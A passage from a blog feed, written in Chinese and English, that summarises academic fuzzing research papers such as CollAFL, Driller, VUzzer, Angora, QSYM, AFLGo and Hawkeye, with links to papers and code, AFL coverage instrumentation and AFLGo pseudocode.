<p>该paper主要对AFL有两个改进:</p>
<ul>
<li>AFL是coverage-based greybox fuzzing，它通过对源程序进行轻量级的插桩，来跟踪每次fuzzing的input覆盖哪些路径，然后将路径hash，从而判断每个input是否到达了一个新的路径，如果到达新的路径，则说明该input较好，将该input作为seed。但由于hash可能会发生collision，可能会导致某些input到达新的路径，却没有将该input作为seed。该paper主要针对这一点，采用了一个新的算法，解决了路径hash collision问题，产生的效果也是比较显著的。</li>
<li>提供了一些策略来将seed进行排序，促使fuzzer去探索没有到达的路径。具体做法就是如果某条路径有很多没有探索到的邻居分支，则对该input进行更多的变异；如果某条路径有很多没有探索到的邻居后代，则对该input产生更多的变异。还有一个策略来帮助发现更多的漏洞：如果某条路径进行更多的内存访问，则对该input产生更多的变异。</li>
</ul>
<p>我个人认为，该论文的主要贡献是提供了一个机制来解决路径的hash collision问题，使得coverage判断更加准确。</p>
<h3 id="AFL-Coverage-Measurements"><a href="#AFL-Coverage-Measurements" class="headerlink" title="AFL Coverage Measurements"></a>AFL Coverage Measurements</h3><p>AFL使用bitmap(默认64KB)来跟踪edge coverage。没一个字节都对应特定edge的hit count。AFL通过对每个basic block进行插桩，为每个basic block都随机分配一个id，当执行每条路径时，对该路径上的每个basic block都进行如下操作:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cur_location= &lt;COMPILE_TIME_RANDOM&gt;;</span><br><span class="line">shared_mem[cur_location ^ prev_location]++;</span><br><span class="line">prev_location = cur_location &gt;&gt; <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>其中上面的prev_location右移一位主要是为了区分路径A-&gt;B和B-&gt;A。由于每个basic block的id是随机分配的，所以这种hash方法很容易产生collision，特别当程序比较大的时候，collision rate也越大。</p>
<h3 id="CollAFL’s-Solution-to-Hash-Collision"><a href="#CollAFL’s-Solution-to-Hash-Collision" class="headerlink" title="CollAFL’s Solution to Hash Collision"></a>CollAFL’s Solution to Hash Collision</h3><p>CollAFL通过三种方式来解决hash collision:</p>
<ol>
<li><img src="/2018/10/05/fuzzing/./image/s1.png" alt="公式1"><br>通过贪心算法，为每个basic block分配x和y的值，保证每条edge计算的hash值都是不同的。</li>
<li>如果每个basic block只有一个前继basic block，即只有一条边到达该basic block，所以只需要将该basic block的id来表示该edge即可。</li>
<li>如果前面两种方法无法解决，则动态的时候为每条边分配不同的id。</li>
</ol>
<h2 id="Driller-Argumenting-Fuzzing-Through-Selective-Symbolic-Execution-ndss-16"><a href="#Driller-Argumenting-Fuzzing-Through-Selective-Symbolic-Execution-ndss-16" class="headerlink" title="Driller: Argumenting Fuzzing Through Selective Symbolic Execution(ndss 16)"></a>Driller: Argumenting Fuzzing Through Selective Symbolic Execution(ndss 16)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/NDSS16_driller.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/shellphish/driller" target="_blank" rel="noopener">source code</a></li>
</ul>
<p>我们都知道，fuzzing对于一些比较宽松的限制(比如x&gt;0)能够很容易的通过变异产生一些输入达到该条件；而symbolic execution非常擅长求解一下magic value(比如x == deadleaf)。这是一篇比较经典的将concolic execution和fuzzing结合在一起的文章，该文章的主要思想就是先用AFL等Fuzzer根据seed进行变异，来测试程序。当产生的输入一直走某些路径，并没有探测到新的路径时，此时就”stuck”了。这时，就是用concolic execution来产生输入，保证该输入能走到一些新的分支。从而利用concolic execution来辅助fuzz。</p>
<h2 id="VUzzer-Application-aware-Evolutionary-Fuzzing-ndss-17"><a href="#VUzzer-Application-aware-Evolutionary-Fuzzing-ndss-17" class="headerlink" title="VUzzer: Application-aware Evolutionary Fuzzing(ndss 17)"></a>VUzzer: Application-aware Evolutionary Fuzzing(ndss 17)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/ndss17_vuzzer.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/vusec/vuzzer" target="_blank" rel="noopener">source code</a></li>
</ul>
<p>Vuzzer是公认的比较好的类AFL fuzzer。它主要利用Data-flow features和Control-flow features来辅助fuzzer变异和进行seed的选择。</p>
<h3 id="Data-flow-features"><a href="#Data-flow-features" class="headerlink" title="Data-flow features"></a>Data-flow features</h3><p>利用dynamic taint analysis 来推断input的结构和类型，以及某段数据在input的偏移。比如，它通过对每个cmp指令进行插桩来判断input的哪些字节与输入有关，并且知道与它比较的另外一个值。同时，Vuzzer也可以对lea指令进行插桩，从而检测<em>index</em>操作是不是与input某些bytes有关。</p>
<h3 id="Control-flow-features"><a href="#Control-flow-features" class="headerlink" title="Control-flow features"></a>Control-flow features</h3><p>Control-flow features可以让Vuzzer推断出执行路径的重要性。比如，某些执行路径最后到达了<em>error-hanling blocks</em>。Vuzzer就通过静态的方法识别出了一下<em>error-handling code</em>。同时，Vuzzer通过对每个basic block赋予特定的权重，来促使fuzzer走到更深的路径中去。</p>
<h2 id="Angora-Efficient-Fuzzing-by-Principled-Search-oakland-18"><a href="#Angora-Efficient-Fuzzing-by-Principled-Search-oakland-18" class="headerlink" title="Angora: Efficient Fuzzing by Principled Search(oakland 18)"></a>Angora: Efficient Fuzzing by Principled Search(oakland 18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/oakland18_Angora.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/AngoraFuzzer/Angora" target="_blank" rel="noopener">source code</a></li>
</ul>
<p>This paper’s contributations:</p>
<ul>
<li><em>Context-sensitive branch coverage.</em> AFL uses context-insensitive branch coverage to approximate program states. This paper adding context information to branch.</li>
<li><em>Scalable byte-level taint tracking.</em> Most path constraints depend on only a few bytes in the input. By tracking which input bytes flow into each path constraint, Angora mutates only these bytes instead of the entire input, therefore reducing the space of exploration substantially.</li>
<li><em>Search based on gradient descent.</em> When mutating the input to satisfy a path constraint. Angora avoids symbolic execution, which is expensive and cannot solve many types of constraints. Instead, Angora uses the gradient descent algorithm popular in machine learning to solve path constraints.</li>
<li><em>Type and shape inference.</em> Many bytes in the input are used collectively as a single value in the program, e.g., a group of four bytes in the input used as a 32-bit signed integer in the program. To allow gradient descent to search efficiently, Angora locates the above group and infers its type.</li>
</ul>
<h2 id="Designing-New-Operating-Primitives-to-Improve-Fuzzing-Performance-CCS-17"><a href="#Designing-New-Operating-Primitives-to-Improve-Fuzzing-Performance-CCS-17" class="headerlink" title="Designing New Operating Primitives to Improve Fuzzing Performance(CCS 17)"></a>Designing New Operating Primitives to Improve Fuzzing Performance(CCS 17)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/ccs17_prefFuzz.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/sslab-gatech/perf-fuzz" target="_blank" rel="noopener">source code</a></li>
</ul>
<h3 id="AFL-Overview"><a href="#AFL-Overview" class="headerlink" title="AFL Overview"></a>AFL Overview</h3><p><img src="https://github.com/bin2415/fuzzing_paper/blob/master/image/afl_overview.png" alt="afl-overview"></p>
<ul>
<li>Mutating inputs(1). AFL uses an evolutionary coverage-based mutation technique to generate test cases for discovering new execution paths of the target application. In AFL, an execution path is represented as a sequence of taken branches(i.e., a coverage bitmap) in the target instance for a given input. To track whether a branch is taken, AFL instruments every conditional branch and function entry of the target application at the time of compilation.</li>
<li>Launching the target application(2). Traditional fuzzers call <em>fork()</em> followed by <em>execve()</em> to launch an instance of the target application. This process occurs in every fuzzing loop to deliver a new input to the target application. It is not only time consuming, but also a non-scalable operation. Previous research shows that the majority of fuzzing execution explores only the shallow part of the code and terminates quickly(e.g., because of invalid input format), which results in frequent executions for the input cases. Thus, the cost of fork() and execve() dominates the cost of fuzzing. To mitigate this cost, AFL introduced a fork server, which is similar to a Zygote process in Android that eliminates the heavyweight execve() system call. After instantiating a target application, the fork server waits for a starting signal sent over the pip from the AFL instance. Upon receiving the request, it first clones the already-loaded program using fork() and the child process continues the execution of the original target code immediately from the entry point(i.e., main) with a given input generated for the current fuzzing loop. The parent process waits for the termination of its child, and then informs the AFL process. The AFL process collects the branch coverage of the past execution, and maintains the test input if it is interesting.</li>
<li>Bookkeeping results(3, 4). The fork server also initializes a shared memory(also known as tracing bitmap) between the AFL instance and the target application. The instance records all the coverage information during the execution and writes it to the shared tracing bitmap, which summarizes the branch coverage of the past execution.</li>
<li>Fuzzing in parallel(6). AFL also supports parallel fuzzing to completely utilize resources available on a multi-core machine and expedite the fuzzing process. In this case, each AFL instance independently executes without explicit contention among themselves(i.e., embarrassingly parallel). From the perspective of the design of AFL, the fuzzing operation should linearly scale with increasing core count. Moreover, to avoid apparent contention on file system accesses, each AFL instance works in its private working directory for test cases. At the end of a fuzzing loop, the AFL instance scans the output directories of other instances to learn their test cases, called the <em>syncing phase</em>. For each collaborating neighbor, it keeps a test case identifier, which indicates the last test case it has checked. It figures out all the test cases that have an identifier larger than the reserved one, and re-executes them one by one. If a test case covers a new path that has not been discovered by the instance itself, the test case is copied to its oen directory for further mutation.</li>
</ul>
<h2 id="QSYM-A-Practical-Concolic-Execution-Engine-Tailored-for-Hybrid-Fuzzing-Usenix-18"><a href="#QSYM-A-Practical-Concolic-Execution-Engine-Tailored-for-Hybrid-Fuzzing-Usenix-18" class="headerlink" title="QSYM: A Practical Concolic Execution Engine Tailored for Hybrid Fuzzing(Usenix 18)"></a>QSYM: A Practical Concolic Execution Engine Tailored for Hybrid Fuzzing(Usenix 18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/usenix18_qsym.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/sslab-gatech/qsym" target="_blank" rel="noopener">source code</a></li>
</ul>
<p>该paper是Usenix 18的Distinguished Paper，其主要针对了当前的concolic execution的三个方面进行了优化: Slow Symbolic Emulation, Ineffective Snapshot and Slow and Inflexible Sound Analysis. 从而使得concolic execution更好的适应fuzzing场景。</p>
<h3 id="Motivation-Performance-Bottlenecks"><a href="#Motivation-Performance-Bottlenecks" class="headerlink" title="Motivation: Performance Bottlenecks"></a>Motivation: Performance Bottlenecks</h3><h4 id="Slow-Symbolic-Emulation"><a href="#Slow-Symbolic-Emulation" class="headerlink" title="Slow Symbolic Emulation"></a>Slow Symbolic Emulation</h4><p>现在主流的conclic executors做符号执行的时候是针对IR中间语言做的(比如KLEE的LLVM IR和angr的VEX IR)，对中间语言模拟执行。其<em>采用IR的原因是实现起来比较简单</em>。由于Intel 64位指令集包含1795条指令，所以针对每条指令总结出来符号的语义对于人工来说是一个非常大的工作量，而IR的指令较少(LLVM IR有62条指令)，符号化这些指令相对比较简单。</p>
<p>然而使用IR则引发了额外的overhead。首先，从机器指令到IR的转换本身就有overhead。由于amd64是CISC(complex instruction set computer)，而IR是RISC(reduced instruction set computer)，一般一条amd64的指令需要转换成多条IR指令，拿angr为例，如果将amd64指令转为VEX IR，则平均增加的指令数是4.69倍。其次，采用IR导致basic block level taint。因为由于效率的原因，从native instructions到IR的转换一般是以basic block为单位的，这样就导致无法将单个的native instruction转换成IR，所以也就只能做到哪些basic block需要符号化，而不是具体的某条指令需要符号化。这样做导致的后果就是如果某个basic block中只有一条指令和输入有关需要符号化，则整个basic block都需要符号模拟，这样就会造成很高的overhead。如果没有IR的话就可以做到指令级别的taint，就能够清楚的判断哪些指令需要符号模拟，哪些指令只需native execution，减少了不必要的符号模拟。实验表明，在一个basic block中，只有30%的指令需要符号模拟。</p>
<h4 id="Ineffective-Snapshot"><a href="#Ineffective-Snapshot" class="headerlink" title="Ineffective Snapshot"></a>Ineffective Snapshot</h4><p>snapshot是conclic execution常用的一个技术，它能够保存某条分支前的状态S，当该分支执行完或者”stuck”时，可以从该状态S直接执行另外一个分支，避免了重新执行的overhead。然而snapshot本身就有一些缺点：snapshot需要保存一些外部的状态(文件系统，内存管理系统)，则此时需要对影响外部状态的系统调用进行处理，一般有两个方法: full system concolic execution and External environment modeling。这两个方法都有一些缺陷：第一个方法是由于外部环境比较复杂，实现起来比较难，overhead较高；第二个则是model的system call较少，并且有些system call建模的不够完全。另外由于fuzzing的输入一般不会共享同一个分支，所以snapshot可能对于fuzzing这个场景也不是很好，所以该paper就没有采用snapshot的机制，对于每个输入都会重新执行，对于系统调用，则具体执行。</p>
<h4 id="Slow-and-Inflexible-Sound-Analysis"><a href="#Slow-and-Inflexible-Sound-Analysis" class="headerlink" title="Slow and Inflexible Sound Analysis"></a>Slow and Inflexible Sound Analysis</h4><p>现在的concolic execution是将某条路径上的所有contraints都满足，从而求解出具体的input。然而复杂的contraints可能会导致输入求解不出。所以该paper的一个解决方法就是只求解出部分contraints。</p>
<h2 id="FAIRFUZZ-A-Targeted-Mutation-Strategy-for-Increasing-Greybox-Fuzz-Testing-Coverage-ASE-18"><a href="#FAIRFUZZ-A-Targeted-Mutation-Strategy-for-Increasing-Greybox-Fuzz-Testing-Coverage-ASE-18" class="headerlink" title="FAIRFUZZ: A Targeted Mutation Strategy for Increasing Greybox Fuzz Testing Coverage(ASE 18)"></a>FAIRFUZZ: A Targeted Mutation Strategy for Increasing Greybox Fuzz Testing Coverage(ASE 18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/ase18-fairfuzz.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/carolemieux/afl-rb" target="_blank" rel="noopener">source code</a></li>
</ul>
<p>FairFuzz focus on branch coverage, it works in two main steps.</p>
<p>First, it identifies the program branches that are rarely hit by previously-generated inputs.  It call such branches rare branches. These rare branches guard under-explored functionalities of the program. By generating more random inputs hitting these rare branches, FairFuzz greatly increases the coverage of the parts of the code guarded by them.</p>
<p>Second, FairFuzz uses a novel lightweight mutation technique to increase the probability of hitting these rare branches. The mutation stategy is based on the observation that certain parts of an input already hitting a rare branch are crucial to satify the conditions necessary to hit that branch. Therefore, to generate more inputs hitting the rare branch via mutation, the parts of the input that are crucial for hitting the branch should not be mutated.</p>
<h2 id="Full-speed-Fuzzing-Reducing-Fuzzing-Overhead-through-Coverage-guided-Tracing-oakland-19"><a href="#Full-speed-Fuzzing-Reducing-Fuzzing-Overhead-through-Coverage-guided-Tracing-oakland-19" class="headerlink" title="Full-speed Fuzzing: Reducing Fuzzing Overhead through Coverage-guided Tracing(oakland 19)"></a>Full-speed Fuzzing: Reducing Fuzzing Overhead through Coverage-guided Tracing(oakland 19)</h2><ul>
<li><a href="https://arxiv.org/pdf/1812.11875.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/FoRTE-Research/UnTracer-AFL" target="_blank" rel="noopener">source code</a></li>
</ul>
<h2 id="ProFuzzer-On-the-fly-Input-Type-Probing-for-Better-Zero-day-Vulnerability-Discovery-oakland-19"><a href="#ProFuzzer-On-the-fly-Input-Type-Probing-for-Better-Zero-day-Vulnerability-Discovery-oakland-19" class="headerlink" title="ProFuzzer: On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery(oakland 19)"></a>ProFuzzer: On-the-fly Input Type Probing for Better Zero-day Vulnerability Discovery(oakland 19)</h2><ul>
<li><a href="https://www.computer.org/csdl/proceedings/sp/2019/6660/00/666000a883.pdf" target="_blank" rel="noopener">paper</a></li>
</ul>
<h2 id="NEUZZ-Efficient-Fuzzing-with-Neural-Program-Smoothing-oakland-19"><a href="#NEUZZ-Efficient-Fuzzing-with-Neural-Program-Smoothing-oakland-19" class="headerlink" title="NEUZZ: Efficient Fuzzing with Neural Program Smoothing(oakland 19)"></a>NEUZZ: Efficient Fuzzing with Neural Program Smoothing(oakland 19)</h2><ul>
<li><a href="https://www.computer.org/csdl/proceedings/sp/2019/6660/00/666000a901.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/Dongdongshe/neuzz" target="_blank" rel="noopener">code</a></li>
</ul>
<h2 id="REDQUEEN-Fuzzing-with-Input-to-State-Correspondence-NDSS-19"><a href="#REDQUEEN-Fuzzing-with-Input-to-State-Correspondence-NDSS-19" class="headerlink" title="REDQUEEN: Fuzzing with Input-to-State Correspondence(NDSS 19)"></a>REDQUEEN: Fuzzing with Input-to-State Correspondence(NDSS 19)</h2><ul>
<li><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04A-2_Aschermann_paper.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/RUB-SysSec/redqueen" target="_blank" rel="noopener">code</a></li>
</ul>
<h2 id="NAUTILUS-Fishing-for-Deep-Bugs-with-Grammars-NDSS-19"><a href="#NAUTILUS-Fishing-for-Deep-Bugs-with-Grammars-NDSS-19" class="headerlink" title="NAUTILUS: Fishing for Deep Bugs with Grammars(NDSS 19)"></a>NAUTILUS: Fishing for Deep Bugs with Grammars(NDSS 19)</h2><ul>
<li><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04A-3_Aschermann_paper.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/RUB-SysSec/nautilus" target="_blank" rel="noopener">code</a></li>
</ul>
<h2 id="Send-Hardest-Problems-My-Way-Probabilistic-Path-Prioritization-for-Hybrid-Fuzzing-NDSS-19"><a href="#Send-Hardest-Problems-My-Way-Probabilistic-Path-Prioritization-for-Hybrid-Fuzzing-NDSS-19" class="headerlink" title="Send Hardest Problems My Way: Probabilistic Path Prioritization for Hybrid Fuzzing(NDSS 19)"></a>Send Hardest Problems My Way: Probabilistic Path Prioritization for Hybrid Fuzzing(NDSS 19)</h2><ul>
<li><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_04A-5_Zhao_paper.pdf" target="_blank" rel="noopener">paper</a></li>
</ul>
<h1 id="Directed-Fuzzing"><a href="#Directed-Fuzzing" class="headerlink" title="Directed Fuzzing"></a>Directed Fuzzing</h1><h2 id="Directed-Greybox-Fuzzing-CCS-17"><a href="#Directed-Greybox-Fuzzing-CCS-17" class="headerlink" title="Directed Greybox Fuzzing(CCS 17)"></a>Directed Greybox Fuzzing(CCS 17)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/CCS17_aflgo.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/aflgo/aflgo" target="_blank" rel="noopener">source code</a></li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Input: Seed Input S</span><br><span class="line"></span><br><span class="line">repeat</span><br><span class="line">    s = CHOOSENEXT(S)</span><br><span class="line">    p = ASSIGNENERGY(s)    <span class="comment">//This paper focus</span></span><br><span class="line">    <span class="keyword">for</span> i from <span class="number">1</span> to p <span class="keyword">do</span></span><br><span class="line">        s' = MUTATE_INPUT(s)</span><br><span class="line">        <span class="keyword">if</span> t' crashes then</span><br><span class="line">            add s' to Sx</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ISINTERESTING(s') then</span><br><span class="line">            add s' to S</span><br><span class="line">        end <span class="keyword">if</span></span><br><span class="line">    end <span class="keyword">for</span></span><br><span class="line">until timeout reached <span class="keyword">or</span> <span class="built_in">abort</span>-signal</span><br><span class="line"></span><br><span class="line">Output: Crashing Inputs Sx</span><br></pre></td></tr></table></figure>
<p>类AFL的fuzzing一般步骤如上所示，该paper主要关注于ASSIGNENERGY(s)这一操作，他们通过对不同的seed s赋予不同的energy，即如果一个seed s’产生的trace距离目标基本块targetB较近，则其energy(p)就较大，基于种子s’进行的变异操作就会变多。所以该paper主要有两个contributation: 设计一套算法计算seed s’产生的trace与targetB的距离；通过模拟退火算法来为每个seed s分配energy。</p>
<h2 id="Hawkeye-Towards-a-Desired-Directed-Grey-box-Fuzzer-CCS-18"><a href="#Hawkeye-Towards-a-Desired-Directed-Grey-box-Fuzzer-CCS-18" class="headerlink" title="Hawkeye: Towards a Desired Directed Grey-box Fuzzer(CCS 18)"></a>Hawkeye: Towards a Desired Directed Grey-box Fuzzer(CCS 18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/ccs18_hawkeye.pdf" target="_blank" rel="noopener">paper</a></li>
<li>source code has not been found.</li>
</ul>
<h3 id="Desired-Properties-of-Directed-Fuzzing"><a href="#Desired-Properties-of-Directed-Fuzzing" class="headerlink" title="Desired Properties of Directed Fuzzing"></a>Desired Properties of Directed Fuzzing</h3><ul>
<li>P1. The DGF should define a <strong>robust</strong> distance-based mechanism that can guide the directed fuzzing by avoiding the bias to some traces and considering all traces to the targets.</li>
<li>P2. The DGF should strike a balance between overheads and utilities in static analysis.</li>
<li>P3. The DGF should select and schedule the seeds to rapidly reach target sites. AFL determines how many new inputs(i.e., “energy”) should be generated from a seed input to improve the fuzzing effectiveness(i.e., increase the coverage); this is termed “power scheduling”.</li>
<li>P4. The DGF should adopt an adaptive mutation strategy when the seeds cover the different program states. The desired design is that when a seed has already reached the target sites(including target lines, basic blocks or functions), it should be given less chances for coarse-grained mutations(e.g., chunk replacement).</li>
</ul>
<h3 id="AFLGo’s-Solution"><a href="#AFLGo’s-Solution" class="headerlink" title="AFLGo’s Solution"></a>AFLGo’s Solution</h3><ul>
<li>针对P1，AFLGo只是选择路径最短的那条，然而路径最短的那条可能无法触发某个漏洞。</li>
<li>For P2. AFLGo only considers the explicit call graph information. As a result, function pointers are treated as the external nodes which are ignored during distance calculation. Besides, AFLGo counts the same callee in tis callers only once, and it does not differentiate multiple call patterns between the caller and callee.</li>
<li>For P3. AFLGo applies a simulated annealing based power scheduler: it favors those seeds closer to the targets by assigning more energy to them to be mutated; the applied cooling sechedule initially assigns smaller weight on the effecte of “distance guidance”, until it reaches the “exploitation” phrase. The issue is that there is no prioritization procedure so the newly generated seeds with smaller distance may wait for a long to be mutated.</li>
<li>For P4. The mutation operators of AFLGo come from AFL’s two non-deterministic strategies: 1) havoc, which does purely randomly mutations such as bit flips, bytewise replace, etc; 2) splice, which generates seeds from some random byte parts of two existing seeds. Notably, during runtime AFLGo excludes all the deterministic mutation procedures and relies purely on the power scheduling on havoc/splice strategies.</li>
</ul>
<h3 id="Suggestions-to-improve-DGFs"><a href="#Suggestions-to-improve-DGFs" class="headerlink" title="Suggestions to improve DGFs:"></a>Suggestions to improve DGFs:</h3><ul>
<li>For P1, a more accurate distance definition is needed to retain trace diversity, avoiding the focus on short traces.</li>
<li>For P2, both direct and indirect calls need to be analyzed; various call patterns need to be distinguished during static distance calculation.</li>
<li>For P3, a moderation to the current power scheduling is required. The distance-guided seed prioritization is also needed.</li>
<li>For P4, the DGF needs an adaptive mutation strategy, which optimally applies the fine-grained abd ciarse-graubed nytatuibs wgeb tge dustabce between the seed to the targets is different.</li>
</ul>
<h3 id="Hawkeye’s-Design"><a href="#Hawkeye’s-Design" class="headerlink" title="Hawkeye’s Design"></a>Hawkeye’s Design</h3><p><img src="https://github.com/bin2415/fuzzing_paper/blob/master/image/hawkeye_overview.png" alt="overview"></p>
<p>During fuzzing, the fuzzer selects a seed from a priority seed queue. The fuzzer applies a power scheduling against the seed with the goal of giving those seeds that are considered to be “closer” to the target sites more mutation chances, i.e, energy. Specifically, this is achieved through a power function, which is a combination of the <em>covered function similarity</em> and the <em>basic block trace distance</em>. For each newly generated test seed during mutation, after capturing its execution trace, the fuzzer will calculate the covered function similarity and the basic block trace distance based on the utilities. For each input execution trace, its basic block trace distance is calculated as the accumulated basic block level distances divided by the total number of executed basic blocks; and its covered function similarity is calculated based on the overlapping of current executed functions and the target function trace closure, as well as the function level distance.</p>
<p>After the energy is determined, the fuzzer adaptively allocates mutation budgets on two different categories of mutations according to mutators’ granularities on the seed(coarse-grained mutations and fine-grained mutations). Afterwards, the fuzzer evaluates the newly generated seeds to prioritize those that have more energy or that have reached the target functions.</p>
<h1 id="Fuzzing-Machine-Learning-Model"><a href="#Fuzzing-Machine-Learning-Model" class="headerlink" title="Fuzzing Machine Learning Model"></a>Fuzzing Machine Learning Model</h1><h2 id="TensorFuzz-Debugging-Neural-Networks-with-Coverage-Guided-Fuzzing-18"><a href="#TensorFuzz-Debugging-Neural-Networks-with-Coverage-Guided-Fuzzing-18" class="headerlink" title="TensorFuzz: Debugging Neural Networks with Coverage-Guided Fuzzing(18)"></a>TensorFuzz: Debugging Neural Networks with Coverage-Guided Fuzzing(18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/tree/master/paper/tensorfuzz.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/brain-research/tensorfuzz" target="_blank" rel="noopener">source code</a></li>
</ul>
<h2 id="Coverage-Guided-Fuzzing-for-Deep-Neural-Networks-18"><a href="#Coverage-Guided-Fuzzing-for-Deep-Neural-Networks-18" class="headerlink" title="Coverage-Guided Fuzzing for Deep Neural Networks(18)"></a>Coverage-Guided Fuzzing for Deep Neural Networks(18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/18_coverage-guided-fuzzing-for-deep-neural-networks.pdf" target="_blank" rel="noopener">paper</a></li>
</ul>
<h1 id="Kernel-Fuzzing"><a href="#Kernel-Fuzzing" class="headerlink" title="Kernel Fuzzing"></a>Kernel Fuzzing</h1><h2 id="RAZZER-Finding-Kernel-Race-Bugs-through-Fuzzing-oakland-19"><a href="#RAZZER-Finding-Kernel-Race-Bugs-through-Fuzzing-oakland-19" class="headerlink" title="RAZZER: Finding Kernel Race Bugs through Fuzzing(oakland 19)"></a>RAZZER: Finding Kernel Race Bugs through Fuzzing(oakland 19)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/oakland19_RAZZER.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/compsec-snu/razzer" target="_blank" rel="noopener">source code</a></li>
</ul>
<h2 id="kAFL-Hardware-Assisted-Feedback-Fuzzing-for-OS-Kernels-Usenix-Security-17"><a href="#kAFL-Hardware-Assisted-Feedback-Fuzzing-for-OS-Kernels-Usenix-Security-17" class="headerlink" title="kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels(Usenix Security 17)"></a>kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels(Usenix Security 17)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/usenix17_kafl.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/RUB-SysSec/kAFL" target="_blank" rel="noopener">source code</a></li>
</ul>
<h2 id="Fuzzing-File-Systems-via-Two-Dimensional-Input-Space-Exploration-oakland-19"><a href="#Fuzzing-File-Systems-via-Two-Dimensional-Input-Space-Exploration-oakland-19" class="headerlink" title="Fuzzing File Systems via Two-Dimensional Input Space Exploration(oakland 19)"></a>Fuzzing File Systems via Two-Dimensional Input Space Exploration(oakland 19)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/oakland19_fuzzing_file_system.pdf" target="_blank" rel="noopener">paper</a></li>
</ul>
<h2 id="PeriScope-An-Effective-Probing-and-Fuzzing-Framework-for-the-Hardware-OS-Boundary-NDSS-19"><a href="#PeriScope-An-Effective-Probing-and-Fuzzing-Framework-for-the-Hardware-OS-Boundary-NDSS-19" class="headerlink" title="PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary(NDSS 19)"></a>PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary(NDSS 19)</h2><ul>
<li><a href="https://people.cs.kuleuven.be/~stijn.volckaert/papers/2019_NDSS_PeriScope.pdf" target="_blank" rel="noopener">paper</a></li>
<li><a href="https://github.com/securesystemslab/periscope" target="_blank" rel="noopener">source code</a></li>
</ul>
<h1 id="Evaluate-Fuzzing"><a href="#Evaluate-Fuzzing" class="headerlink" title="Evaluate Fuzzing"></a>Evaluate Fuzzing</h1><h2 id="Evaluating-Fuzz-Testing-CCS-18"><a href="#Evaluating-Fuzz-Testing-CCS-18" class="headerlink" title="Evaluating Fuzz Testing(CCS 18)"></a>Evaluating Fuzz Testing(CCS 18)</h2><ul>
<li><a href="https://github.com/bin2415/fuzzing_paper/blob/master/paper/ccs18_Evaluating%20Fuzz%20Testing.pdf" target="_blank" rel="noopener">paper</a></li>
</ul>
<p>They found that:</p>
<ul>
<li>Most papers failed perform multiple runs, and those that did failed to account for varying performance by using a statistical test.</li>
<li>Many papers measured fuzzer performance not by counting distinct bugs, but instead by counting “unique crashes” using heuristics such as<br>AFL’s coverage measure and stack hashes.</li>
<li>Many papers used short timeouts, without justification.</li>
<li>Many papers did not carefully consider the impact of seed choices on algorithmic improvements.</li>
<li>Papers varied widely on their choice of target programs.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;#interesting-fuzzing&quot;&gt;Interesting Fuzzing&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#coverage-based-greybox-fuzzing-as-markov-chainccs-
    
    </summary>
    
      <category term="fuzzing" scheme="http://bin2415.github.io/categories/fuzzing/"/>
    
    
      <category term="fuzzing" scheme="http://bin2415.github.io/tags/fuzzing/"/>
    
  </entry>
  
  <entry>
    <title>os tutorial</title>
    <link href="http://bin2415.github.io/2018/09/27/os-tutorial/"/>
    <id>http://bin2415.github.io/2018/09/27/os-tutorial/</id>
    <published>2018-09-27T13:17:19.000Z</published>
    <updated>2018-12-23T05:33:53.018Z</updated>
    
